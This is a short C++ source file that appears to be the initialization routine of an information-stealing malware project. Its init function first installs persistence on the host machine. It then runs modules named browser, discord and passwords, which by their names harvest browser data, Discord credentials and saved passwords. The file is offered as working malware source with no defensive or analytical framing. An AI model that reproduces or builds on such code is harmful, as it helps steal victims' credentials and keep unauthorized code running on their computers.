#include "../../include/modules/initialize.hpp"

#include "../../include/modules/browser/browser.hpp"
#include "../../include/modules/discord/discord.hpp"
#include "../../include/modules/passwords/passwords.hpp"
#include "../../include/persistance/persistance.hpp"

void initialize::init(char* argv) {
    persistance* persist = new persistance(argv);
    persist->persist(argv);
    delete persist;

    browser* bro = new browser();
    discord* dis = new discord();
    passwords* patch = new passwords();
    bro->dispatch();
    dis->dispatch();
    patch->dispatch();

    delete bro;
    delete dis;
    delete patch;
}
